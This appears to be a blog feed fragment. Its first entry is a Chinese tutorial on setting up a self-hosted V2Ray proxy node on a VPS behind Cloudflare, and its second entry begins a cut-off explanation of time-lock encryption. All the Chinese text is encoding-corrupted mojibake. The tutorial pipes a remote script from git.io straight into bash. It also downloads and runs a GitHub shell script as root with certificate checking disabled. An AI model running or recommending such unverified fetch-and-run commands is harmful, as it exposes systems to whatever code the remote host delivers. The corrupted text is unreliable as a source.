    <content type="html"><![CDATA[<h1 id="VPSé€‰æ‹©">VPSé€‰æ‹©</h1><p>é¦–å…ˆé€‰æ‹©vpsä¸€å®šè¦é€‰æ‹©å›½å¤–çš„ï¼Œå›½å†…çš„éƒ½ä¸å…è®¸ç§è‡ªæ­å»ºèŠ‚ç‚¹ï¼Œä¸€æ—¦å‘ç°å°±ä¼šè¢«æŸ¥å°å¹¶ä¸”ä¸äºˆé€€æ¬¾ã€‚</p><p>æˆ‘é€‰çš„æ˜¯NackNerdçš„vpsï¼Œè¿™å®¶vpsä¸æ¥å—é€€æ¬¾ï¼Œè™½ç„¶ä¾¿å®œä½†æ˜¯è¦è°¨æ…é€‰æ‹©ï¼Œå¯ä»¥é€‰ä¸€äº›æ”¯æŒé€€æ¬¾çš„å…ˆè¯•è¯•é€Ÿåº¦ã€‚</p><p>ä¸€èˆ¬æ¥è¯´NackNerdè¥¿é›…å›¾æˆ–è€…åœ£ä½•å¡å¯èƒ½ä¼šå¥½ä¸€ç‚¹ï¼Œå®æµ‹å¼€äº†bbråŠ é€Ÿåœ¨ä¸‹åˆå»¶è¿Ÿåªæœ‰120mså·¦å³ï¼Œè¿˜ç®—å¯ä»¥ã€‚ä½†æ˜¯æ™šé«˜å³°å»¶è¿Ÿæ¯”è¾ƒé«˜ï¼Œé¢„ç®—æ¯”è¾ƒä½çš„æƒ…å†µä¸‹å¯ä»¥è€ƒè™‘ï¼Œé¢„ç®—é«˜å»ºè®®ä¹°æ¬ç“¦å·¥çš„å›½å†…ä¸“çº¿ã€‚</p><p>å¯ä»¥åœ¨ç½‘ä¸Šæœç´¢å¯¹åº”è´­ä¹°ä¼˜æƒ ï¼Œä¼šä¾¿å®œå¾ˆå¤šï¼Œæˆ‘çš„æ˜¯11.38$ä¹°çš„è¥¿é›…å›¾èŠ‚ç‚¹ï¼Œä½¿ç”¨çš„æ˜¯Ubuntuç³»ç»Ÿï¼Œä¹‹åçš„ä¸€åˆ‡å‘½ä»¤éƒ½æ˜¯åŸºäºUbuntuç³»ç»Ÿï¼Œå¦‚æœæ˜¯centosæˆ–è€…å…¶ä»–è¯·è‡ªè¡Œæœç´¢ç›¸åº”å‘½ä»¤ã€‚</p><p>è´­ä¹°æˆåŠŸä¹‹åä¼šç”¨é‚®ç®±å‘é€ç»™ä½ å¯¹åº”ä¸»æœºIPå’Œç”¨æˆ·åä»¥åŠå¯†ç ã€‚</p><h1 id="å¯ç”¨CDNï¼Œæ‹¯æ•‘è¢«å¢™IP">å¯ç”¨CDNï¼Œæ‹¯æ•‘è¢«å¢™IP</h1><p>å¦‚æœä½ çš„vpsèŠ‚ç‚¹è¢«å¢™è¿‡ï¼Œé‚£å°±æœ€å¥½ç”¨CDNåŠ é€Ÿã€‚</p><p>ä½†æ˜¯æ²¡æœ‰çš„è¯å¯ä»¥æ²¡å¿…è¦ä½¿ç”¨ï¼ŒCloudfareå·ç§°â€œå‡é€Ÿäº‘â€ï¼Œå¹³æ—¶å»¶è¿Ÿ250msèµ·æ­¥ï¼Œå¾ˆå½±å“ä¸Šç½‘é€Ÿåº¦ï¼Œè€Œä¸”cdnèƒ½è§£å¯†ä½ æ‰€æœ‰çš„æµé‡ï¼Œè¿˜æ˜¯æŒºä¸å®‰å…¨çš„ã€‚</p><h2 id="åŸŸåè´­ä¹°">åŸŸåè´­ä¹°</h2><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦ä¸€ä¸ªåŸŸåï¼Œè¿™é‡Œå¯ä»¥è‡ªè¡Œè´­ä¹°ã€‚</p><h2 id="ä¿®æ”¹DNSè§£ææœåŠ¡å™¨">ä¿®æ”¹DNSè§£ææœåŠ¡å™¨</h2><p>éšåç™»å½•<a href="https://cloudfare.com/">Cloudfare</a>å®˜ç½‘ï¼Œå…ˆæ³¨å†Œåç™»å½•ï¼Œç™»å½•æˆåŠŸä¹‹ååœ¨Homeä¸­ç‚¹å‡»æ·»åŠ ç«™ç‚¹ï¼Œå†åœ¨è·³è½¬åçš„é¡µé¢è¾“å…¥è‡ªå·±æ³¨å†Œçš„åŸŸåã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%9B%BE12.png" alt="å›¾12"></p><p>ä½¿ç”¨å…è´¹çš„æ–¹æ¡ˆå³å¯ã€‚</p><p><img src="vps%E6%90%AD%E5%BB%BA%E8%87%AA%E7%94%A8%E8%8A%82%E7%82%B9/image-20231103161306583.png" alt="image-20231103161306583"></p><p>éšåCloudfareä¼šè‡ªåŠ¨ç»™ä½ åˆ†é…ä¸¤ä¸ªDNSï¼Œå¦‚æœæ²¡æœ‰å°±è¿›å…¥DNSè§£æä¹‹ä¸­æŸ¥çœ‹ã€‚</p><p><img src="vps%E6%90%AD%E5%BB%BA%E8%87%AA%E7%94%A8%E8%8A%82%E7%82%B9/image-20231103161758749.png" alt="image-20231103161758749"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20231103161612923.png" alt="image-20231103161612923"></p><p>ä¹‹ååœ¨æ³¨å†ŒåŸŸåçš„å¹³å°æœç´¢å¦‚ä½•æ›´æ”¹DNSï¼Œæ¯”å¦‚æˆ‘ç”¨çš„é˜¿é‡Œäº‘çš„ï¼Œæˆ‘å°±æœç´¢é˜¿é‡Œäº‘åŸŸåæ›´æ”¹DNSï¼Œç…§ç€å®˜æ–¹æ•™ç¨‹æ¥å°†ä½ åŸŸåçš„DNSæ”¹æˆCloudfareç»™ä½ åˆ†é…çš„ä¸¤ä¸ªåœ°å€ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20231103180355593.png" alt="image-20231103180355593"></p><p>æ›´æ”¹DNSä¹‹åä¸åŒå‚å®¶éœ€è¦çš„æ—¶é—´ä¸åŒï¼Œé˜¿é‡Œäº‘å°±éœ€è¦æœ€å¤š48å°æ—¶æ‰ä¼šæˆåŠŸç”Ÿæ•ˆï¼Œä¸€å®šè¦ç¡®ä¿DNSæ›´æ”¹ç”Ÿæ•ˆä¹‹åæ–¹å¯è¿›è¡Œæ¥ä¸‹æ¥çš„æ“ä½œã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20231103180525892.png" alt="image-20231103180525892"></p><h2 id="è®¾ç½®Cloudfareè¯ä¹¦">è®¾ç½®Cloudfareè¯ä¹¦</h2><p>ç‚¹å‡»å·¦ä¾§SSL/TLSåè®®ï¼Œæ¦‚è¿°éƒ¨åˆ†ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20231103181349420.png" alt="image-20231103181349420"></p><p>å°†åŠ å¯†æ¨¡å¼è®¾ç½®ä¸ºä¸¥æ ¼ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20231103181330265.png" alt="image-20231103181330265"></p><h2 id="æ·»åŠ DNSè§£æ">æ·»åŠ DNSè§£æ</h2><p>åœ¨cloudfareä¸­çš„DNSè§£æç‚¹å‡»æ·»åŠ è®°å½•ï¼Œæ·»åŠ ä½ æƒ³è¦ä¼ªè£…çš„åŸŸåï¼Œå°½é‡ä¸è¦ä½¿ç”¨è£¸åŸŸåï¼Œä¸ä¼šå¡«çš„è·Ÿæˆ‘å¡«ä¸€æ ·çš„å°±å¥½ã€‚</p><p>IPv4åœ°å€å°±æ˜¯ä½ vpsçš„ä¸»æœºåœ°å€ï¼Œè®°å¾—æŠŠä»£ç†çŠ¶æ€æ”¹æˆä»…é™DNSï¼Œç‚¹å‡»saveä¿å­˜å°±å¥½äº†ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20231103175812801.png" alt="image-20231103175812801"></p><p>åˆ°è¿™é‡ŒCDNåŸŸåçš„åœ°æ–¹å·²ç»å…¨éƒ¨æå®šäº†ã€‚</p><h1 id="èŠ‚ç‚¹æ­å»º">èŠ‚ç‚¹æ­å»º</h1><h2 id="è¿æ¥åˆ°VPS">è¿æ¥åˆ°VPS</h2><p>é¦–å…ˆè¿æ¥sshï¼Œæˆ‘ä½¿ç”¨çš„æ˜¯Xshellï¼Œç‚¹å‡»è¿æ¥ï¼Œåœ¨ä¸»æœºè¿™é‡Œè¾“å…¥å¯¹åº”çš„IPåœ°å€ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%9B%BE1.png" alt="å›¾1"></p><p>ç‚¹å‡»ç”¨æˆ·èº«ä»½éªŒè¯ï¼Œè¾“å…¥é‚®ç®±ä¸­æ”¶åˆ°çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œç‚¹å‡»è¿æ¥ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%9B%BE2.png" alt="å›¾2"></p><p>ç‚¹å‡»æ¥æ”¶å¹¶ä¿å­˜ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%9B%BE3.png" alt="å›¾3"></p><p>å‡ºç°è¿™æ ·çš„é¡µé¢å°±æ˜¯æˆåŠŸäº†ï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%9B%BE4.png" alt="å›¾4"></p><p>æƒ³æ¢å¯†ç çš„å¯ä»¥è¾“å…¥passwdç›´æ¥æ›´æ¢å¯†ç ï¼Œæ›´æ¢å¯†ç ä¹‹ååœ¨è¯¥sshè¿æ¥çš„è®¾ç½®ä¸­ä¹Ÿè¦ç›¸åº”æ›´æ”¹ç”¨æˆ·èº«ä»½éªŒè¯çš„å¯†ç ï¼Œè¿™é‡Œå°±ä¸æ¼”ç¤ºäº†ã€‚æˆ‘ä»¬è¾“å…¥apt-get updateå‘½ä»¤ï¼Œå¦‚æœæ²¡æœ‰rootæƒé™è¦å…ˆè¾“å…¥suç„¶åè¾“å…¥å¯†ç è¿›å…¥rootï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%9B%BE5.png" alt="å›¾5"></p><p>ä¹‹åä½¿ç”¨è„šæœ¬ä¸€é”®å®‰è£…ï¼š</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">bash &lt;(<span class="hljs-name">wget</span> -qO- -o- https<span class="hljs-symbol">://git</span>.io/v2ray.sh)<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%9B%BE6.png" alt="å›¾6"></p><p>ä¹‹åè¾“å…¥v2rayï¼Œè¿›å…¥ç®¡ç†ç•Œé¢ï¼Œè¾“å…¥1æ·»åŠ ä¸€ä¸ªé…ç½®ï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%9B%BE7.png" alt="å›¾7"></p><p>ä¹‹åé€‰æ‹©8ï¼‰VLESS-WS-TLSï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%9B%BE8.png" alt="å›¾8"></p><p>è¿™æ—¶å€™è¾“å…¥æˆ‘ä»¬åˆšåˆšå‡†å¤‡å¥½çš„åŸŸåï¼Œæ³¨æ„è¿™é‡Œå½“æ—¶å‰ç¼€æ˜¯ä»€ä¹ˆå°±è¦åŠ ä¸Šå‰ç¼€ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%9B%BE9.png" alt="å›¾9"></p><p>å›è½¦ä¹‹åå°±å®Œäº‹äº†ï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%9B%BE10.png" alt="å›¾10"></p><p>è¿™æ—¶å€™é€‰ä¸­å¤åˆ¶è¿™ä¸ªurlå†å¯¼å…¥v2rayNå®¢æˆ·ç«¯ä¸­å°±å¥½äº†ï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%9B%BE11.png" alt="å›¾11"></p><h2 id="å¯ç”¨bbråŠ é€Ÿ">å¯ç”¨bbråŠ é€Ÿ</h2><p>å¦‚æœä½ å¾—ç½‘ç»œå¾ˆå¡é¡¿ï¼Œå»¶è¿Ÿæ¯”è¾ƒé«˜çš„è¯ï¼Œé‚£ä½ å¯ä»¥è¯•è¯•bbråŠ é€Ÿï¼Œæˆ–è®¸å¯ä»¥æœ‰æ”¹å–„ã€‚</p><p>bbrä¸€é”®è„šæœ¬ï¼š</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">wget -N --no-<span class="hljs-keyword">check</span>-certificate <span class="hljs-string">&quot;https://raw.githubusercontent.com/chiakge/Linux-NetSpeed/master/tcp.sh&quot;</span> <span class="hljs-variable">&amp;&amp;</span> chmod +<span class="hljs-keyword">x</span> tcp.sh <span class="hljs-variable">&amp;&amp;</span> ./tcp.sh<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªè„šæœ¬åŒ…å«bbr/bbré­”æ”¹ç‰ˆ/bbrplus/é”é€Ÿï¼Œå¤šä¸ªåŠ é€Ÿå¯ä»¥é€‰æ‹©ï¼Œè¿™é‡Œæˆ‘ä»¬é€‰æ‹©2.bbrplusï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%9B%BE13.png" alt="å›¾13"></p><p>æœ‰çš„ä¼šå‡ºç°è¿™ç§ç•Œé¢ï¼Œè¿™æ—¶å€™è¾“å…¥å³æ–¹å‘é”®é€‰æ‹©Noï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%9B%BE14.png" alt="å›¾14"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%9B%BE15.png" alt="å›¾15"></p><p>è¾“å…¥yé‡å¯ï¼Œé‡å¯ä¹‹åè¦åŒå‡»è¿™å·¦è¾¹çš„è¿™ä¸ªçº¢çº¢çš„é‡æ–°å»ºç«‹è¿æ¥ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20231103180146919.png" alt="image-20231103180146919"></p><p>ä¹‹åä½¿ç”¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./tcp.sh<br></code></pre></td></tr></table></figure><p>é‡æ–°è¿è¡Œè„šæœ¬ï¼Œé€‰æ‹©7å¼€å¯bbrplusåŠ é€Ÿã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%9B%BE16.png" alt="å›¾16"></p><p>åˆ°è¿™é‡Œæ‰€æœ‰å·¥ä½œå·²ç»åšå®Œäº†ï¼Œå³é”®v2rayNå®¢æˆ·ç«¯çš„å°å›¾æ ‡ï¼Œé€‰æ‹©è‡ªåŠ¨é…ç½®å³å¯ç§‘å­¦ä¸Šç½‘äº†ï¼Œæƒ³å…³æ‰çš„æ—¶å€™ç‚¹æ¸…é™¤ç³»ç»Ÿä»£ç†å°±è¡Œã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20231103175219970.png" alt="image-20231103175219970"></p>]]></content>
    
    
    
    <tags>
      
      <tag>vpsèŠ‚ç‚¹</tag>
      
      <tag>CDNåŠ é€Ÿ</tag>
      
      <tag>VLESS-WS-TLS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ—¶æ§æ€§åŠ å¯†çš„å®ç°</title>
    <link href="/2023/10/31/%E6%97%B6%E6%8E%A7%E6%80%A7%E5%8A%A0%E5%AF%86%E7%9A%84%E5%AE%9E%E7%8E%B0/"/>
    <url>/2023/10/31/%E6%97%B6%E6%8E%A7%E6%80%A7%E5%8A%A0%E5%AF%86%E7%9A%84%E5%AE%9E%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="æ—¶æ§æ€§åŠ å¯†åŸç†">æ—¶æ§æ€§åŠ å¯†åŸç†</h1><p>è¦æƒ³å®ç°ä¸€ä¸ªåŠ å¯†ç®—æ³•é¦–å…ˆå…ˆæ¸…æ¥šå®ƒçš„åŸç†ï¼Œæ—¶æ§æ€§åŠ å¯†ç®—æ³•ä»¥å…¶ç‹¬ç‰¹çš„æ—¶é—´æ•æ„Ÿè€Œå¹¿æ³›åº”ç”¨ã€‚</p><h2 id="åˆå§‹åŒ–">åˆå§‹åŒ–</h2><p>é¦–å…ˆæ—¶æ§æ€§åŠ å¯†è§„å®šäº†å‡ ä¸ªåŸŸï¼š</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>G</mi><mn>1</mn></msub><mtext>ä¸ºç´ æ•°</mtext><mi>q</mi><mtext>çš„å¾ªç¯åŠ æ³•ç¾¤</mtext><mspace width="1em"/><msub><mi>G</mi><mn>2</mn></msub><mtext>ä¸ºç´ æ•°</mtext><mi>q</mi><mtext>çš„å¾ªç¯ä¹˜æ³•ç¾¤</mtext><mspace linebreak="newline"></mspace><mtext>åŒçº¿æ€§æ˜ å°„</mtext><mi>e</mi><mo>:</mo><msub><mi>G</mi><mn>1</mn></msub><mo>Ã—</mo><msub><mi>G</mi><mn>1</mn></msub><mo>â†’</mo><msub><mi>G</mi><mn>2</mn></msub><mspace linebreak="newline"></mspace><msub><mi>H</mi><mn>1</mn></msub><mo>:</mo><mo stretchy="false">{</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><msup><mo stretchy="false">}</mo><mo>âˆ—</mo></msup><mo>â†’</mo><msub><mi>G</mi><mn>1</mn></msub><mspace width="2em"/><msub><mi>H</mi><mn>2</mn></msub><mo>:</mo><msub><mi>G</mi><mn>2</mn></msub><mo>â†’</mo><mo stretchy="false">{</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><msup><mo stretchy="false">}</mo><mi>n</mi></msup><mo separator="true">,</mo><mtext>Â </mtext><mi>n</mi><mtext>ä¸ºæ˜æ–‡é•¿åº¦</mtext><mspace linebreak="newline"></mspace><mtext>é€‰å–</mtext><msub><mi>G</mi><mn>1</mn></msub><mtext>ç¾¤ä¸­çš„ç”Ÿæˆå…ƒ</mtext><mi>P</mi><mo>âˆˆ</mo><msub><mi>G</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">G_1\text{ä¸ºç´ æ•°} q\text{çš„å¾ªç¯åŠ æ³•ç¾¤}\quadG_2\text{ä¸ºç´ æ•°}q\text{çš„å¾ªç¯ä¹˜æ³•ç¾¤}\\\text{åŒçº¿æ€§æ˜ å°„}e:G_1 \times G_1 \rightarrow G_2\\H_1:\{0,1\}^* \rightarrow G_1\qquadH_2:G_2 \rightarrow \{0,1\}^n,\ n\text{ä¸ºæ˜æ–‡é•¿åº¦}\\\text{é€‰å–}G_1\text{ç¾¤ä¸­çš„ç”Ÿæˆå…ƒ}P\in G_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord text"><span class="mord cjk_fallback">ä¸ºç´ æ•°</span></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord text"><span class="mord cjk_fallback">çš„å¾ªç¯åŠ æ³•ç¾¤</span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord text"><span class="mord cjk_fallback">ä¸ºç´ æ•°</span></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord text"><span class="mord cjk_fallback">çš„å¾ªç¯ä¹˜æ³•ç¾¤</span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord text"><span class="mord cjk_fallback">åŒçº¿æ€§æ˜ å°„</span></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â†’</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mclose"><span class="mclose">}</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7387em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">âˆ—</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â†’</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:2em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â†’</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mclose"><span class="mclose">}</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace">Â </span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mord text"><span class="mord cjk_fallback">ä¸ºæ˜æ–‡é•¿åº¦</span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord text"><span class="mord cjk_fallback">é€‰å–</span></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord text"><span class="mord cjk_fallback">ç¾¤ä¸­çš„ç”Ÿæˆå…ƒ</span></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆˆ</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p><p>ä»¥æˆ‘çš„ç†è§£æ¥è¯´ï¼ŒH1æ˜¯å°†01å­—ç¬¦ä¸²æ˜ å°„åˆ°æ¤­åœ†æ›²çº¿ï¼ŒH2æ˜¯å°†æ¤­åœ†æ›²çº¿ä¸Šçš„ç‚¹é‡æ–°æ˜ å°„å›æœ‰é™åŸŸã€‚</p><h2 id="åŠ å¯†å’Œè§£å¯†">åŠ å¯†å’Œè§£å¯†</h2><ol><li><p>é¦–å…ˆæ—¶é—´æœåŠ¡å™¨é€‰å–éšæœºæ•°<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">s</span></span></span></span>ä½œä¸ºç§é’¥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><msub><mi>s</mi><mrow><mi>p</mi><mi>r</mi><mi>i</mi><mi>v</mi></mrow></msub></mrow><annotation encoding="application/x-tex">ts_{priv}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9012em;vertical-align:-0.2861em;"></span><span class="mord mathnormal">t</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span 